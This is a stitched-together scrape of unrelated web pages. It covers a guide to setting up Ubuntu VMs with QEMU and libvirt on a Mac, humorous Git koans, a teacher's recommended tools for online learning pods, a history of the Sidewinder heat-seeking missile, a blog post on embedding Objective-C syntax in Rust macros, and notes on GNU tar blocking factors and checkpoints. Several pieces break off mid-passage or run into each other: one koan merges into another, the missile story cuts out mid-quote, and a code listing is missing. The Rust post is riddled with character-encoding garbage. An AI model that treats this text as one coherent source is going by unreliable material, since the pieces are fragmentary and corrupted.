<p>There are two ways to access the virtual display of the VM, either using a VNC client or the virt-viewer program. I recommend <a href="https://www.realvnc.com/">RealVNC Viewer</a>. The VNC client is responsive and quick to install, but if you have multiple VMs you need to manually manage the different ports. With virt-viewer, you get a popup with all the VMs currently running, but it is laggy and takes an eternity to install. <a href="https://github.com/jeffreywildman/homebrew-virt-manager">virt-viewer</a> can be installed through homebrew. The rest of this guide uses VNC.</p>
<ol>
<li>
<p>Create a <code>vms</code> folder in your home directory, and generate a disk image. Change <code>50g</code> to the size of your prefered disk:</p>
<pre><code>mkdir ~/vms &amp;&amp; cd ~/vms
qemu-img create -f qcow2 ubuntu.qcow2 50g
</code></pre>
</li>
<li>
<p>Download the <a href="https://releases.ubuntu.com/20.04/ubuntu-20.04.1-live-server-amd64.iso">Ubuntu Server 20.04 Install Image</a> and my <a href="https://raw.githubusercontent.com/yoonsikp/vm_configs/master/ubuntu.xml">libvirt XML template</a> and place the .iso and .xml files in the same folder.</p>
</li>
<li>
<p>Modify the following elements in the <code>ubuntu.xml</code> file to match your your VM preferences and file paths. Save, then run <code>virsh define ubuntu.xml</code> followed by <code>virsh start ubuntu</code>.</p>
<pre><code>&lt;domain type='qemu' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'&gt;
&lt;name&gt;name of the VM&lt;/name&gt;
&lt;memory unit='GB'&gt;how much ram&lt;/memory&gt;
&lt;vcpu&gt;how many cpus&lt;/vcpu&gt;
...
&lt;disk type='file' device='disk'&gt;
&lt;source file='full path to your qcow2 file'/&gt;
...
&lt;disk type='file' device='cdrom'&gt;
&lt;source file='full path to your install iso'/&gt;
</code></pre>
</li>
<li>
<p>Start RealVNC Viewer and connect to <code>localhost</code>. Click the <code>Ctrl+Alt+Del</code> button to reboot the machine, and quickly press <code>Esc</code> to get into the boot menu. Press the number that matches the Ubuntu Server image.<br>
<img src="https://www.naut.ca/blog/content/images/2020/08/Screen-Shot-2020-08-26-at-8.17.04-PM.jpg" alt="Screen-Shot-2020-08-26-at-8.17.04-PM"></p>
</li>
<li>
<p>Install Ubuntu Server normally, making sure to enable the SSH server. Once it restarts you can connect to the VM from your terminal by running <code>ssh -p 2222 user@localhost</code>.</p>
</li>
<li>
<p>To send a shutdown signal to your VM, run <code>virsh shutdown ubuntu</code>. To force shutdown, run <code>virsh destroy ubuntu</code>.</p>
</li>
<li>
<p>To forward a port, e.g. port 443 from the VM to port 8443 locally, run the following: <code>ssh -p 2222 -L8443:localhost:443 user@localhost</code></p>
</li>
</ol>
<h3 id="multiplevms">Multiple VMs</h3>
<p>If you want to create multiple VMs, create an XML file for each machine with a unique UUID, VM name, and VNC port. Also, change the <code>hostfwd</code> argument so that each VM exposes a different port for SSH, e.g. <code>2223</code> instead of <code>2222</code>. After you have defined them all, you can get a list of the VMs that are currently running with <code>virsh list</code>.</p>

<h2 id="s1-silence"><a href="#s1-silence">Silence</a></h2>

<p>A Python programmer handed her <code>~/.gitconfig</code> to Master Git.  Among the many
lines were the following:</p>

<pre><code>[alias]
; Explicit is better than implicit.  If we want to merge
; we should do so ourselves.
pull = pull --ff-only</code></pre>

<p>Master Git nodded.  "<code>git pull origin master</code>," said the programmer.</p>

<p>Master Git pulled down the latest changes on <code>master</code> and automatically merged
them with the programmer's changes.</p>

<p>"But Master Git, did I not say to only fast-forward in my configuration?!" she
cried.</p>

<p>Master Git looked at her, nodded, and said nothing.</p>

<p>"Then why did you not warn me of a problem with my configuration?" she asked.</p>

<p>Master Git replied: "there was no problem."</p>

<p>Months later the programmer was reading <code>git --help config</code> for a different
reason and found enlightenment.</p>

<h2 id="s2-one-thing-well"><a href="#s2-one-thing-well">One Thing Well</a></h2>

<p>A UNIX programmer was working in the cubicle farms.  As she saw Master Git
traveling down the path, she ran to meet him.</p>

<p>"It is an honor to meet you, Master Git!" she said.  "I have been studying the
UNIX way of designing programs that each do one thing well.  Surely I can learn
much from you."</p>

<p>"Surely," replied Master Git.</p>

<p>"How should I change to a different branch?" asked the programmer.</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I create a branch?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I update the contents of a single file in my working directory,
without involving branches at all?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>After this third answer, the programmer was enlightened.</p>

<h2 id="s3-only-the-gods"><a href="#s3-only-the-gods">Only the Gods</a></h2>

<p>The great historian was trying to unravel the intricacies of an incorrect merge
that had happened many months ago.  He made a pilgrimage to Master Git to ask
for his help.</p>

<p>"Master Git," said the historian, "what is the nature of history?"</p>

<p>"History is immutable.  To rewrite it later is to tamper with the very fabric of
existence."</p>

<p>The historian nodded, then asked: "Is that why rebasing commits that have been
pushed is discouraged?"</p>

<p>"Indeed," said Master Git.</p>

<p>"Splendid!" exclaimed the historian.  "I have a historical record of a merge
commit with two parents.  How can I find out which branch each parent was
originally made on?"</p>

<p>"History is ephemeral," replied Master Git, "the knowledge you seek can be
answered only by the gods."</p>

<p>The historian hung his head as enlightenment crushed down upon him.</p>

<h2 id="s4-the-hobgoblin"><a href="#s4-the-hobgoblin">The Hobgoblin</a></h2>

<p>A novice was learning at the feet of Master Git.  At the end of the lesson he
looked through his notes and said, "Master, I have a few questions.  May I ask
them?"</p>

<p>Master Git nodded.</p>

<p>"How can I view a list of <em>all</em> tags?"</p>

<p>"<code>git tag</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> remotes?"</p>

<p>"<code>git remote -v</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> branches?"</p>

<p>"<code>git branch -a</code>", replied Master Git.</p>

<p>"And how can I view the current branch?"</p>

<p>"<code>git rev-parse --abbrev-ref HEAD</code>", replied Master Git.</p>

<p>"How can I delete a remote?"</p>

<p>"<code>git remote rm</code>", replied Master Git.</p>

<p>"And how can I delete a branch?"</p>

<p>"<code>git branch -d</code>", replied Master Git.</p>

<p>The novice thought for a few moments, then asked: "Surely some of these could be
made more consistent, so as to be easier to remember in the heat of coding?"</p>

<p>Master Git and a novice were walking along a bridge.</p>

<p>The novice, wanting to partake of Master Git's vast knowledge, said:
"<code>git branch --help</code>".</p>

<p>Master Git sat down and lectured her on the seven forms of <code>git branch</code>, and
their many options.</p>

<p>They resumed walking.  A few minutes later they encountered an experienced
developer traveling in the opposite direction.  He bowed to Master Git and said
"<code>git branch -h</code>".  Master Git tersely informed him of the most common <code>git
branch</code> options.  The developer thanked him and continued on his way.</p>

<p>"Master," said the novice, "what is the nature of long and short options for
commands?  I thought they were equivalent, but when that developer used <code>-h</code> you
said something different than when I said <code>--help</code>."</p>

<p>"Perspective is everything," answered the Master.</p>

<p>The novice was puzzled.  She decided to experiment and said "<code>git -h branch</code>".</p>

<p>Master Git turned and threw himself off the railing, falling to his death on the
rocks below.</p>

<p>Upon seeing this, the novice was enlightened.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7d26e9b4ac55b229ffd2"><div><p>This August, I started teaching <a href="https://www.modulo.app/manishamodule">a digital learning pod</a> for Kindergarten-2nd grade students. </p><p>When I decided I was going to run an online learning pod, I started thinking about ways to create engaging educational opportunities for kids online. I knew that teaching on an online medium was going to be very different than teaching in a physical classroom.  </p><p>Rather than grumble too much about how much better teaching in-person was, I decided to try to make the most out of my new virtual classroom. They say that <a href="https://reggioemilia2015.weebly.com/environment-as-a-third-teacher.html">the environment is the child’s third teacher</a>. Much like Maria Montessori developed materials to make her classroom environment conducive to learning, I knew I needed to find the best tools possible (software and hardware) to support kids and teachers to optimize this online learning environment for learning. </p><p>Fortunately, many of the parents in my group work in tech, so they were happy to lend a hand and help me problem-solve to make sure their kids had a good experience in the group.</p><p>Teaching a group of Kindergarten-2nd grade students online presented some unique challenges. When we started, it was painfully noisy for all involved, and kids were constantly disappearing -  slipping outside the frame of the camera.  Some younger children are often difficult to understand as is, not to mention with the additional obstacle of having their voices travel through the internet to my computer speaker . The result was that kids were bored and I thought I might lose my mind from the noise. </p><p>We tested dozens of different conferencing platforms, tablets, headphones and other unique devices and software solutions to get our group communicating well online.</p><p>My original goal was to get to a point where we would be able to provide a nice social experience 2x/week for 45 minutes. I told my tech savvy parents I needed to find a way where I could hear the kids whispering across the room, see them lap down or do a jumping jack. It was an ambitious goal, but one month in, we’ve surpassed by expectations.</p><p>Now, by using the right tools, teaching zoom etiquette and choosing activities that translate well to an online environment, I’ve found 4 and 5 year old kids (and even children are young as 3) are begging to stay online 3 hours after class has started! They are moving and jumping around, actively participating in class discussions and making meaningful friendships with other children across the country. </p><p>This is what we’ve found works best to allow lots of movement, engagement and clear sound. (And also helps stop me from getting tired or worn out when I teach)</p><p><strong>Here are the tools I recommend for group learning online:</strong></p><ul data-rte-list="default"><li><p><a href="https://zoom.us/">Zoom for conferencing</a>. Zoom simply does sound and video for groups better than any other platform. </p></li><li><p>*<a href="https://www.amazon.com/Gamma-Ray-Trust-Blocking-Glasses/dp/B083ZKY9TH/">Gamma Ray Blue Light Blocking Glasses</a> to prevent eye strain (for teachers)</p></li><li><p><a href="https://www.amazon.com/Xenvo-iPhone-Camera-Lens-Clip/dp/B01A6D2JVI/">Xenvo Pro Lens Kit</a> so you can see a large area, kids don’t have to sit still and feel free to move around the room</p></li><li><p><a href="https://www.apple.com/airpods-pro">*Airpod Pro</a> for the best headphones that won’t fall out of small ears when doing jumping jacks, have great sound </p></li><li><p><a href="https://www.apple.com/macbook-air/">Macbook</a> for zoom&nbsp;and most apps.</p></li><li><p><a href="https://www.amazon.com/Nulaxy-Ergonomic-Adjustable-Computer-Compatible/dp/B077B9W343">Nulaxy Laptop Stand</a> to make us look more glamorous when we record sessions (double-chin eliminated!) and also allows kids to stand and move about, not sit still.</p></li><li><p><a href="https://krisp.ai/">Krisp.ai</a> to reduce background noise on zoom</p></li><li><p>If you can also afford an <a href="https://www.apple.com/ipad-pro">ipad</a>, please get one because this is best for IOS apps which are amazing to support your children's learning.  The new Ipad pro is best for screen sharing.</p></li></ul><p>I’m privileged to be able to afford the tools to support my teaching. Many of the families in my group are privileged to be able to purchase tools to support their children’s learning. And we’ve been able to purchase devices for those who can’t.  An estimated 22% of US students don’t have access to a single computer to help them learn remotely. This is a travesty and one we’re working around the clock to change through Schoolclosures.org and our <a href="https://www.gofundme.com/f/givecomputers">Give Computers</a> campaign. </p><p>While I’m excited to share these tools, I’m also outraged and downhearted by the growing divide between rich and poor students due to lack of access to technology. </p><p>If you are on a budget, I strongly recommend investing in an Ipad to cover all your key bases. Generally, your cell phone plan will let you pay for your Ipad on a payment plan. An Amazon kindle will also do. </p><p>Families looking for free hardware or software should apply to <a href="http://www.givecomputers.org/">givecomputers.org</a></p><p>For families who are still struggling to find a device to support their teaching or child’s learning, please contact us so we can give you a hand. We want to help everyone we can to get the technology they need to learn. </p><p>For those looking to go the extra mile, here’s an intro to zoom video I made where I talk in more detail about the hardware I’ve chosen and some tips for beginner teachers on using zoom. </p></div></div></div>]]>

<span>T</span><p>he Cold War flared hot on August 23, 1958, when <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis" target="_blank">Communist China bombarded Matsu and Quemoy,</a> islands of the Nationalist Republic of China (Taiwan). As Red Chinese and American warships faced off in the Formosa Strait, Nationalist <a href="http://en.wikipedia.org/wiki/F-86_Sabre" target="_blank">F-86F Sabres</a> flew against MiG fighters, including the new <a href="http://en.wikipedia.org/wiki/MiG-17" target="_blank">MiG-17 “Fresco.”</a> Cruising above and beyond the reach of the Sabres’ machine guns—weapons that remained basically unchanged since the dawn of fighter aircraft—Fresco pilots enjoyed not only superior numbers but superior technology.
</p><p>
Or did they? In late September the Sabres took on new, American-supplied weaponry—needle-like, 9-foot-long rockets that were barb-tipped and finned, with delicate glass noses instead of steel warheads. The new rocket had no wires, no radio, no way for the pilot to guide it after launch. Yet it was equipped with movable fins. It could change course. For the Taiwanese pilots the conclusion was inescapable, if unbelievable: The Americans had created a missile that could seek out and destroy the enemy on its own.
</p>





<div><img src="http://www.donhollway.com/foxtwo/ex-0.jpg" width="967" height="311" alt=""><p><b>Prototype Sidewinder EX-O airframe at China Lake.<br>

<p>From the Allies’ unguided <a href="http://en.wikipedia.org/wiki/Le_Prieur_rocket" target="_blank">Le Prieur</a> of World War I to World War II’s wire-guided German <a href="http://en.wikipedia.org/wiki/Ruhrstahl_X-4" target="_blank">Ruhrstahl X-4</a>, air-to-air rockets had never proven particularly effective. After WWII, air combat was supposed to be all about intercepting nuclear-armed strategic bombers at long range. The experts fancied missiles with radar guidance, though this required launch planes to track and “paint” targets with microwaves throughout attack runs. 
</p><p>
Meanwhile, at the U.S. Naval Ordnance Test Station at <a href="http://en.wikipedia.org/wiki/China_Lake" target="_blank">China Lake</a> in California’s Mojave Desert, a few dozen gadgeteers under physicist William B. McLean were toying with lead-sulfide proximity fuzes that were sensitive to the infrared radiation generated by heat. China Lake’s directive was R&amp;D, not weapon design, and critics derisively referred to his lab as “McLean’s Hobby Shop.” But that didn’t stop his little team from completely revolutionizing air warfare.

</tr></tbody></table>


<p>
Reasoning that a fuze capable of exploding a warhead near a hot target could also be made to home in on it, McLean sought to put a guidance system entirely onboard a standard 5-inch air-to-ground rocket. With in-house volunteers, miscellaneous funds and spare time—but without official approval—he undertook to develop an intelligent fuze for a heat-seeking air-to-air missile.
</p><p>
It took five years. “I personally spent nearly three years [just] considering possibilities,” McLean later wrote. “It is easy to build something complicated; it’s hard to build it so that it’s simple.” 
</p><p>
The final design was indeed simple: a parabolic mirror spinning gyroscopically at 4,200 rpm inside the rocket’s transparent nose. The distance of an infrared blip’s reflection from the axis of spin indicated its angle-off; current from the centrally mounted lead-sulfide detector kept the “eye” on target via electromagnets around its rim and controlled the missile’s canard guide fins. 
</p><p>
Future astronaut <a href="http://en.wikipedia.org/wiki/Wally_Schirra" target="_blank">Wally Schirra</a>, then a hotshot Korea veteran with a MiG-15 kill to his credit, remembered his first visit to the lab. The China Lake eggheads had a “dome-shaped device, made of glass….a man-made eyeball,” he recalled. “I was a cigarette smoker in those days, and I had one in my hand. As I crossed the room, I noticed that the eyeball was tracking me.”

<p>
Since missile roll would interfere with the gyro’s spin, on the fly McLean’s team invented “rollerons”—tailfin-mounted, airstream-driven gyro wheels whose spin counteracted the missile’s. The crowning touch, however, was wiring the seeker to aim not where the target was, but <i>where it would be.</i> In dogfights the missile itself would take on enemy aircraft on their own terms: seek them out, run them down and outmaneuver them to make the kill. 
This can’t be overstated. More than 60 years ago, back when automobiles were lumbering hunks of Detroit steel, the proto-computer Eniac needed a room full of vacuum tubes merely to calculate ballistic trajectories and the only robots were costumed actors in sci-fi films, what Bill McLean’s China Lake team did—with just 14 tubes and fewer than 24 moving parts, in a package less than 10 feet long, 5 inches across and weighing 160 pounds—was invent fire-and-forget: an autonomous combat robot. They named it Sidewinder, after the <a href="http://en.wikipedia.org/wiki/Crotalus_cerastes" target="_blank">Mojave horned rattlesnake</a>, which stalks its prey by their heat signatures in darkness, and crosses the desert sands with a sinuous, winding motion not unlike the missiles’ corkscrewing trajectory.

</p><div><img src="http://www.donhollway.com/foxtwo/skynight.jpg" width="624" height="375">
<p><b>U.S. Navy Douglas F3D-2 Skyknight (BuNo 123744) fires a Sidewinder 1-C missile at the Naval Weapons Center (NWC) China Lake, California (USA), on 27 June 1961. The escorting plane is a McDonnell F3H-2N Demon (BuNo 133550).</b></p>
</div>


<p>
Schirra and other test pilots amused themselves by locking onto not only flying target drones, but also locomotives, tractor-trailers and Greyhound buses near China Lake. Their main complaint, since Sidewinder firing parameters varied with altitude, airspeed and G-load, was having to check a cockpit voltmeter to confirm lock-on: “We’ve got to get something besides the damn gauge. You can’t have a pilot, a fighter pilot in combat, looking [down] at funny little gauges to see if he can fire or not.”
</p><p>
It turned out to be the final piece of the puzzle. Anyone who’s flown a combat flight sim knows the 840 Hz Sidewinder “growl,” indicating missile readiness and target lock. (Newer versions chirp.) This robot doesn’t just think; it talks. 
</p><p>
Just five years later, under the code name <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis#Overview" target="_blank">“Operation Black Magic,”</a> Americans in <a href="http://en.wikipedia.org/wiki/F-100_Super_Sabre" target="_blank">F-100 Super Sabres </a>were simulating Red Chinese Frescos, teaching Nationalist pilots “pitch-up” Sidewinder launches against high-altitude targets. The MiG pilots were about to get a nasty surprise.

<p>
The final tally depends on which side does the counting, but on a single day, September 24, 1958, the Nationalists’ Sidewinder-equipped Sabres shot down at least 10 Frescos. Two weeks later the People’s Republic sued for peace. Command of the air, and thus the battlefield, had been handed back to the West, courtesy of the Sidewinder. Yet one MiG reportedly returned to base with an unexploded missile still embedded in its wing root. Thus despite the project’s top-secret nature, on its first outing the Sidewinder had been outed.
</p><p>
The Soviets, weapons suppliers to half the world, later admitted that the Sidewinder’s near-biological intelligence was a complete revelation to them. They set about reverse-engineering a copy—the <a href="http://en.wikipedia.org/wiki/AA-2_Atoll" target="_blank">K15, NATO code name AA-2 “Atoll”</a>—and devising tactics to defeat heat-seekers.
</p><p>
The Sidewinder, now designated Air Intercept Missile (AIM) 9, proved decisive once again when <a href="http://en.wikipedia.org/wiki/Second_Kashmir_War" target="_blank">Pakistan and India went to war for the second time over Kashmir in 1965.</a> The air battle was unique: primarily American versus British and French warplanes. The Pakistanis were outnumbered 5-to-1, but they had Sidewinders.

But before they could make good their escape, Khan used his speed to come back around into a Sidewinder envelope. “I aimed the missile at the nearest aircraft, and heard the loud pitched missile tone,” he recalled. “The sight indicated that I was in range. With all other requisite firing conditions met, I squeezed the trigger, and kept it pressed. I waited, only to note that the missile had not fired.

<p>Yep, thatâ€™s Rust code with embedded Objective-C syntax, and it works. Why would you do such a thing? Maybe you want tighter interop between the Rust and Objective-C parts of your iOS app. Maybe you want to write your iOS app <em>entirely</em> in Rust. Or maybe you just wanted to see if it was possible after your <a href="https://twitter.com/porglezomp">colleague</a>â€™s offhand remark.</p>

<p>(For me, it was the last one, absolutely.)</p>

<p>This post is going to walk through what it took to make this possible, so hereâ€™s a table of contents:</p>

<p>Sections 3-5 might actually be useful to other people looking to write Rust macros, so even though this project is a toy, you may still get something out of reading the post. However, if youâ€™re looking to use Objective-C from Rust in production, you should not be using my unsafe toy here. Instead, use Steven Sheldonâ€™s <a href="https://crates.io/crates/objc"><code>objc</code> crate</a>. Sheldon also has a blog post from near the start of the project that talks about <a href="https://sasheldon.com/blog/2014/11/28/interoperating-between-objective-c-and-rust/">his design process beyond the bare message-send implementation</a>.</p>

<p>That said, if you want to see the full source of my little monstrosity, you can <a href="https://belkadan.com/source/rust-inline-objc/">check out the repository</a>.</p>

<h2 id="background-on-objective-c">Background on Objective-C</h2>

<p>My normal audience these days is probably Swift developers, but I expect this one to make rounds with at least some Rust people as well. Itâ€™d be easy for both groups to not have much direct experience with Objective-C, the primary language used by Apple for both macOS<sup id="fnref:osx" role="doc-noteref"><a href="#fn:osx">1</a></sup> and iOS since their releases in 2001 and 2007. So, hereâ€™s the quick summary: itâ€™s â€œjustâ€� C, except when you start working with â€œobjectâ€� types. And nearly everything you do with those objects is based on a dynamic dispatch model implemented in the <em>runtime.</em> Because of the two parts of that sentence (â€œdynamic dispatchâ€� and â€œimplemented in the runtimeâ€�), people have come up with a lot of clever and powerful techniques to make programs simpler, more expressive, or more extensible, though sometimes at the cost of security, secrecy, and stability.</p>

<p>More relevant to us, however, is that a language whose features are (nearly) all available in a runtime library is a language thatâ€™s easy to bridge to dynamically, as long as you donâ€™t have really tight performance constraints. So hereâ€™s the deal: nearly everything you do in Objective-C is calling methods by <em>sending messages,</em> and the way this works is that methods are regular C functions stored in a dispatch table keyed by a uniqued string called a <dfn>selector</dfn>. It is likely that the most heavily-optimized piece of code in Appleâ€™s libraries is <code>objc_msgSend</code>, which takes a <dfn>receiver</dfn>, a selector, and the arguments to the method, does a (cached) lookup of the selector in the receiverâ€™s classâ€™s dispatch table(s), and then jumps directly to the appropriate, polymorphically-selected implementation of the method.</p>

<p>There are more things the Objective-C runtime exposes, but messages are absolutely the most important.</p>

<p>â€¦Oh, one more thing. Because Objective-C is an extension to C, it has to use syntax that doesnâ€™t conflict with C syntax. That means keywords with <code>@</code> signs in front of themâ€”one of the few symbols on the US keyboard that doesnâ€™t already have a meaning in Câ€”and a unique bracket-based â€œmessage sendâ€� syntax that takes a while to get used to:</p>

<pre><code>// Objective-C
NSString *fileStr = [[NSString alloc] initWithData:fileContents encoding:NSUTF8StringEncoding];

// Pseudo-Swift
let fileStr: NSString = NSString.alloc().initWithData(fileContents, encoding: NSUTF8StringEncoding)

// Actual Swift
let fileStr = NSString(data: fileContents, encoding: .utf8)

// Pseudo-Rust
let fileStr: *const NSString = NSString::alloc().initWithData(fileContents, NSUTF8StringEncoding)

// Idiomatic-ish Rust
let file_str = NSString::from_data(file_contents, NSStringEncoding::UTF8)
</code></pre>

<p>People almost universally think Objective-C syntax is ugly when they first see it, almost universally find it completely normal after a few years, and largely (though <em>not</em> almost universally) find idiomatic Swift easier to read even if theyâ€™re used to Objective-C.</p>

<h2 id="objective-c-from-rust-manually">Objective-C from Rust, manually</h2>

<p>From this point on youâ€™ll be expected to read Rust syntax without step-by-step explanations. Iâ€™ll try to explain whatâ€™s going on for my Swift and other non-Rust readersâ€”I myself am still a relative newcomer to Rustâ€”but itâ€™ll be pretty fast. This is <em>not</em> intended to be an introduction to Rust or Rust macros!</p>

<p>Given that the Objective-C runtime exposes a public API, we should be able to pretty much just call that from Rust, and indeed we can:</p>

</code></pre></div>

<p>Now, this code should make most Rust users pretty horrified. It starts out okay, declaring some types and then declaring the Rust versions of the C API from libobjc. Then itâ€™s got a funny empty extern block to link the Foundation framework, but sure, thatâ€™s fine. And itâ€™s got explicitly-null-terminated strings because thatâ€™s what C-based APIs generally use. (Rust doesnâ€™t guarantee null termination by default, which makes slicing a Rust string easier.)</p>

<p>But then thereâ€™s a monstrosity of a line involving <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html"><code>std::mem::transmute</code></a>, Rustâ€™s equivalent of Swiftâ€™s <code>unsafeBitCast(_:)</code> or C++â€™s <code>reinterpret_cast</code> (and now <a href="https://en.cppreference.com/w/cpp/numeric/bit_cast"><code>bit_cast</code></a>) or Câ€™sâ€¦well, okay, C doesnâ€™t have a direct equivalent, but a plain old cast when youâ€™re talking about function pointers like this. The <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html">docs for <code>transmute</code></a> even tell you to go use other things if possible.</p>

<p>So, what are we doing? Well, remember what I said about Objective-C and <code>objc_msgSend</code>: methods are regular C functions, and <code>objc_msgSend</code> â€œjumps directly to the appropriate, polymorphically-selected implementation of the methodâ€�. That means that the correct way to call <code>objc_msgSend</code> is to <em>pretend it has the right type for the method youâ€™re calling.</em></p>

<p>In C (and Swift, for that matter), that conversion would require explicitly specifying the type of all arguments and return values. But Rust has really powerful type inference within a function body, and that extends to specifying only <em>some</em> generic parameters, and leaving others out.<sup id="fnref:swift-inference" role="doc-noteref"><a href="#fn:swift-inference">2</a></sup> In this case I need to specify that weâ€™re casting to a C function pointer with two arguments and a non-void return, but not anything more than that. The remaining information will be filled in based on how the function pointer is used.</p>

<p>With that, you should understand the (cursed) code above. Go ahead. Try it on your own machine (if your machine is a Mac).</p>

<h2 id="recursive-rust-macros">Recursive Rust macros</h2>

<p>Rust has a pretty robust macro system, so it wouldnâ€™t be impossible or even too hard to make a macro for â€œmessage sendâ€�. Thatâ€™s the route that the <a href="https://crates.io/crates/objc"><code>objc</code> crate</a> takes:</p>

<div><pre><code><span></span><span>let</span><span> </span><span>url_class</span><span> </span><span>=</span><span> </span><span>class</span><span>!</span><span>(</span><span>NSURL</span><span>);</span><span></span>
<span>let</span><span> </span><span>description_obj</span>: <span>*</span><span>mut</span><span> </span><span>Object</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>url_class</span><span>,</span><span> </span><span>description</span><span>];</span><span></span>
<span>let</span><span> </span><span>utf8_ptr</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>description_obj</span><span>,</span><span> </span><span>UTF8String</span><span>];</span><span></span>
<span>println</span><span>!</span><span>(</span><span>"{}"</span><span>,</span><span> </span><span>CStr</span>::<span>from_ptr</span><span>(</span><span>utf8_ptr</span><span>).</span><span>to_string_lossy</span><span>());</span><span></span>
</code></pre></div>

<p>But while thatâ€™s clearly the right choice for serious Rust work, I wanted something more ambitious. More integrated. Moreâ€¦ridiculous.</p>

<blockquote data-dnt="true"><p lang="en" dir="ltr">wait a minute. this is just objective-c <a href="https://t.co/dVQMYKKVTI">pic.twitter.com/dVQMYKKVTI</a></p>— Harlan Haskins (@harlanhaskins) <a href="https://twitter.com/harlanhaskins/status/1133210047952015360?ref_src=twsrc%5Etfw">May 28, 2019</a></blockquote>


<p>What I wanted was for Objective-Câ€™s messaging syntax, or something like it, to be valid anywhere in Rust code. It didnâ€™t have to be exactly Objective-C, but I quickly realized the <em>advantage</em> of Objective-Câ€™s syntax: itâ€™s delimited, i.e. itâ€™s a self-contained expression that can be dropped into something larger without changing how that larger thing parses. (Thatâ€™s probably why itâ€™s bracketed in C as well.) Within the brackets, thereâ€™s basically two forms:</p>

<pre><code>[receiver-expr no-arg-selector]
[receiver-expr selector-piece:arg-expr selector-piece:second-arg-expr...]
</code></pre>

<p>If I were <em>just</em> matching that, I could use Rustâ€™s original <a href="https://doc.rust-lang.org/book/ch19-06-macros.html#declarative-macros-with-macro_rules-for-general-metaprogramming">pattern-matching macros</a>. But to take a whole block of code, and replace everything that looks like a message lock <em>in</em> that blockâ€¦well, it might be possible with pattern-matching and quite a bit of recursion, but itâ€™s going to be a lot easier to use <em><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">procedural macros</a>,</em> a Rust macro interface written in Rust and used as a compiler plugin. (Swift folks, basically what <a href="https://github.com/apple/swift-syntax">SwiftSyntax</a> allows you to do, but invoked on-demand during compilation.)</p>

<p>The procedural macro examples …</p></div></div>

    <p>I wish it were not so, but the <a href="https://www.gnu.org/software/tar/manual/">GNU tar manual</a> is not always easy to parse, nor is it necessarily complete on all topics.</p>
    <p>A common impediment to effectively using GNU <code>tar</code> wth modern tape drives is understanding how to use the <a href="https://www.gnu.org/software/tar/manual/html_section/tar_76.html">blocking factor</a> and <a href="https://www.gnu.org/software/tar/manual/html_section/tar_26.html">checkpoint</a> features.
    </p><h2>Blocking factor</h2>
    <p>First, let's define some terms as they are used with GNU <code>tar</code> in increasing order of abstraction:</p>
    <dl>
    <dt>block</dt><dd>A <em>block</em> in GNU <code>tar</code> is a unit of data that is 512 bytes long, regardless of what "block size" might mean for any underlying storage devices.</dd>
    <dt>record</dt><dd><em>records</em> are composed of one or more <em>blocks</em>. In a given archive the number of <em>blocks</em> in each <em>record</em> is set by the <em>blocking factor</em>. When tar writes to an archive file (or through a pipe, to a tape etc) it always writes one full <em>record</em> at a time.</dd>
    <dt>input file</dt><dd>When an <em>input file</em> is read by <code>tar</code> to be stored in an archive it is converted to a sequence of one or more <em>records</em>. The number of <em>records</em> needed depends on how large the file is, but there will always be at least one whole <em>record</em> for every file.</dd>
    </dl>
    <p>The current default blocking factor of GNU <code>tar</code> is <code>20</code>, though you can verify this with your own installation:</p>
    <pre>$ tar --show-defaults
--format=gnu -f- <strong>-b20</strong> --quoting-style=escape ...
</pre>

    <p>By multiplying the default blocking factor of <code>20</code> by the size of one block in bytes, we can tell that <code>tar</code> will write to our tape 10240 bytes at a time, or 10 KiB at a time.</p>
    <p>This may have made sense in the distant past and with tape drives that expected to be sent data in specific record sizes, however modern LTO-7 tape drives should be written at around 300 MiB per second for maximum efficiency. At the default blocking factor this means tar would have to finish a record and start a new one every 0.03 milliseconds or so.</p>
    <p>Modern drives also accept a wide range of "block sizes" for writes, presumably these no longer strongly correspond to the physical layout of the tape media:</p>
    <pre># dmesg -t | grep "Block limits"
st 6:0:1:0: [st0] Block limits 1 - 8388608 bytes.</pre>
    <p>Increasing the blocking factor (option <code>-b</code>) to <code>1024</code> or <code>2048</code> when creating tape archives with GNU <code>tar</code> and modern tape drives results in a dramatic improvement in throughput and makes it much easier to hit the desired 300 MiB per second data rate. This corresponds to a record size of 512 KiB or 1 MiB respectively.</p>
    <p>As with any storage throughput optimisation it is important to benchmark all changes to ensure they result in a real-world improvement, though <code>1024</code> is probably a good place to start with tests.</p>
    <h2>Checkpoints</h2>
    <p>Because <code>tar</code> operations may be long running, it can be useful to have feedback about progress during the operation.</p>
    <p>GNU <code>tar</code> has a few methods to provide this feedback however for integrating <code>tar</code> in to large operations (e.g. a backup management system) the <code>exec</code> method provides a lot of flexibility.</p>
    <p>This method will cause <code>tar</code> to execute an external program at periodic intervals while operating, and set certain environment variables with information about the state of progress.</p>
    <p>The <code>TAR_CHECKPOINT</code> environment variable is just documented as being the "number of the checkpoint", the exact meaning of which is amibiguous.</p>
    <p>As far as I can tell from reading the source code (invocations in <code>src/buffer.c</code> of <code>checkpoint_run()</code> which increments the <code>checkpoint</code> variable) <code>TAR_CHECKPOINT</code> is incremented for every <code>record</code> written, so to convert from a <code>checkpoint number</code> to bytes written or read:</p>
    <blockquote>With the default blocking factor of <code>20</code>, and checkpoints configured for every <code>100</code> records, the 1st checkpoint will be <code>checkpoint 100</code>, at which time 1013760 bytes (99 records of 20 blocks each) has been written. The second checkpoint will be <code>200</code>, at which time 2037760 bytes will have been written, and so on.</blockquote>
    <p>Or, more succinctly:</p><blockquote><code>bytes_written_or_read = (checkpoint_number - 1) * blocking_factor * 512</code></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
